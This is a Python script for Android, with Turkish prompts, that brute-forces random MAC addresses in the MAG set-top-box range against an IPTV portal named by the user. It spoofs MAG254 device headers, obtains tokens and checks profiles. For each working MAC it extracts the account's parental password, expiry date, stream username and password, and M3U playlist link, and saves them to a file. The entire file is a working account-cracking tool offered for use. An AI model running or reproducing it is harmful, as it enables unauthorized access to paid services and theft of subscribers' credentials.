import requests, datetime
import json,random,sys, time
import androidhelper as sl4a
import subprocess
import pathlib
subprocess.run(["clear", ""])
ad = sl4a.Android()
oto=0
tur=0
say=0
bul=0
hit=0
cpm=1
ses= requests.Session()

macSayisi=99999999991#deneme sayisı
feyzo=("""
\33[32m
 ▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʀ-OTO-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰ ''\33[0m\n
Bu çalışma FeyzullahK tarafından kodlanmıştır. 
Hiçbir kaynak kullanılmamış ve alıntı yapılmamıştır. 
 
 \33[33mDestek verenler:
     @BarisTM
     @ByTurK_Turkiye
     @garaveli(Bestsharingsteam) \33[0m
     \33[32m
 ▰▰▰▰▰▰▰ 𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@ ▰▰▰▰▰▰▰  '' " '
\33[0m""") 
print(feyzo) 
#################
panel = input("""
Örnek PanelAdı:Port = iptvturkiye.xyz:8080\n
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
subprocess.run(["clear", ""])
print(feyzo) 
Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 
if Macs=="evet" or Macs=="Evet" :
    Seri=input("Örnek=00:1A:79:\33[31m5\33[0m\nÖrnek=00:1A:79:\33[31mFa\33[32m\nBir yada iki değer Yazınız!!!\33[0m\n\33[1m00:1A:79:\33[31m")
    #Seri=Seri
    MacCombo=MacCombo+Seri[:2]
#################
subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
if not len(feyzo)==299 or panel=="" :
    exit() 
if len(mm)==6:
	turet=6
	MacCombo=MacCombo+":"
if len(mm)==7:
	turet=5
if len(mm)==8:
	turet=4
	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
DosyaA="/sdcard/" + panel.replace(":","_") +"@Feyzo.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(feyzo) 
for mag in range(0,macSayisi):
	oto=""
	mac=""
	tur=0
	if turet==5:
		nokta=1
	else:
		nokta=2
	for i in range(turet):
		if tur ==nokta:
			oto=oto+":"
			tur=0
			nokta=2
		oto=oto+random.choice('ABCDFE1234567890')
		tur = tur +1
		mac=oto
		
		
	mac=MacCombo+mac
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	#mac="00:1a:79:1a:aa:74" 
	headera={
"Host": panel,
"Connection": "keep-alive",
"Accept": "*/*",
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Referer": "http://"+panel+"/c/" ,
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f","Accept-Encoding": "gzip, deflate",
}
	url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=" 
	
	res = ses.get(url1, headers=headera, timeout=20, verify=False)
	
	veri=str(res.text)
	#print(veri)
	say=say+1
	cpm=(time.time()-cpm)
	cpm=(round(60/cpm))
	print ("\33[0m" +mac+"-\33[32m" +panel +'\033[96m\n' +"      >>>>>Total:" + str(say)+" " +Rhit+ "Hit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
	cpm=time.time()
	if not veri in ("js"):
		token=veri.replace('{"js":{"token":"',"")
		token=token.replace('"}}',"")
		#print(token)
		
		headerb={
		"Host": panel,
		"Connection": "keep-alive",
		"Accept": "*/*",
		"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
		"Referer": "http://"+panel+"/c/" ,
		"Accept-Language": "en-US,*",
		"Accept-Charset": "UTF-8,*;q=0.8",
		"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
		"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
		"Authorization": "Bearer "+token,
		}
		
		url2="http://"+panel+"/portal.php?type=stb&action=get_profile"
		res = ses.get(url2, headers=headerb, timeout=15, verify=False)
		veri=str(res.text)
		#print(veri)
		chk="" 
		chk=veri.split('{"id":')[1]
		chk=chk.split(',"name')[0]
		chk=chk.replace('"',"")
		if not chk =="null":
			#print(chk+'\n')
			adult=veri.split('parent_password":"')[1]
			adult=adult.split('"')[0]
			#print(adult)
			hit=hit+1
			file = pathlib.Path("/sdcard/kemik_sesi.mp3")
			if file.exists ():
				ad.mediaPlay("/sdcard/kemik_sesi.mp3")
				#print(trh)
			headerc={
			"Host": panel,
			"Connection": "keep-alive",
			"Accept": "*/*",
			"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
			"Referer": "http://"+panel+"/c/" ,
			"Accept-Language": "en-US,*",
			"Accept-Charset": "UTF-8,*;q=0.8",
			"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
			"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
			"Accept-Encoding": "gzip, deflate",
			"Authorization": "Bearer "+token,
			}
			
			url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+mac
			
			res = ses.get(url3, headers=headerc, timeout=15, verify=False)
			veri=str(res.text)
			passw=""
			if not veri in ("phone"):
				trh=veri.split('phone":"')[1]
				trh=trh.replace('"}}',"")
				#print(trh)
				
#				url4="http://"+panel+"/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
#				res = ses.get(url4, headers=headerc, timeout=15, verify=False)
#				veri=str(res.text)
#				print(veri)
				veri=""
				url5="http://"+panel+"/portal.php?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml" 
				res = ses.get(url5, headers=headerc, timeout=15, verify=False)
				veri=str(res.text)
				try:
					token2=veri.split('cmd":"')[1]
					token2=token2.split('"')[0]
				except:pass
				url6="http://"+panel+"/portal.php?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
				
				res = ses.get(url6, headers=headerc, timeout=15, verify=False)
				
				veri=str(res.text)
				try:
					real=veri.split('\/')[2]
					userm=veri.split('\/')[4]
					pasdm=veri.split('\/')[5]
					#print(real+'\n'+userm+'\n'+pasdm)
					
					headerm={
					"Host": panel,
					"Connection": "keep-alive",
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
					"Pragma": "no-cache",
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate",
					}
					
					urlm="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&type=m3u"
					
					mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
					
					res = ses.get(urlm, headers=headerm, timeout=15, verify=False)
					veri=str(res.text)
				except:pass
				vvv=veri[:1]
				if veri =="":
					vvv="<"
				#print(veri)
				#print(vvv)™
				if not vvv =="<":
					portal=veri.split('url":')[1]
					portal=portal.split(',')[0]
					realm="Real➤ http://"+portal.replace('"',"")
					portal="Portal➤ http://"+panel+"/c/"
					port=veri.split('port":')[1]
					port=port.split(',')[0]
					port=""+port.replace('"',"")
					
					user=veri.split('username":')[1]
					user=user.split(',')[0]
					user="User ➤ "+user.replace('"',"")
					
					passw=veri.split('password":')[1]
					passw=passw.split(',')[0]
					passw="Pass ➤ "+passw.replace('"',"")
					
					bitis=veri.split('exp_date":')[1]
					bitis=bitis.split(',')[0]
					bitis=bitis.replace('"',"")
					if bitis=="null":
						bitis="Unlimited"
					else:
						bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
					bitis="B.Tarih➤ "+bitis
					
					acon=veri.split('active_cons":')[1]
					acon=acon.split(',')[0]
					acon="Act.Con➤ "+acon.replace('"',"")
					mcon=veri.split('max_connections":')[1]
					mcon=mcon.split(',')[0]
					mcon="Max.Con➤ "+mcon.replace('"',"")
			mc="▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʀ-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰"+'\n'+"├●Panel➤ http://"+panel+"/c/"+'\n'+"├●Real ➤ http://"+real+'\n'+"├●Mac  ➤ "+mac+'\n'+"├●Exp. ➤ "+trh+'\n'+"├●APass➤ " +adult+'\n'
			
			imza=mc
			if not passw=="":
				imza=imza+"├────────FeyzullahK@"+'\n'+"├●Panel➤ http://"+panel+'\n'+"├●"+user+'\n'+"├●"+passw+'\n'+"├●"+bitis+'\n'+"├●"+acon+'\n'+"├●"+mcon+'\n'
			imza=imza+"├────────@Mr.Feyzo"+'\n'+"├●M3U_Url➤ "+mlink+'\n'
			
			imza=imza+"▰▰▰▰𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@▰▰▰▰"+'\n'+"ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟᴅᴇɴ ᴛᴀʀᴀᴍᴀ"+'\n' 
			
			print(imza)
			yaz(imza+'\n'+'\n')
			

#		
#	
